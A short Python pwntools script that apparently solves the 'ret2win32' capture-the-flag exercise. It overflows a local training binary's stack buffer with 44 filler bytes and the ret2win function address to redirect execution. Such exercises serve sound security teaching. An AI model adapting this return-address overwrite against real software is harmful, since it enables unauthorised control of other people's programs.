from pwn import *

bin="./ret2win32"
p=process(bin)
e=ELF(bin)

win=e.symbols[b'ret2win']

payload=b'A'*44+pack(win)

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
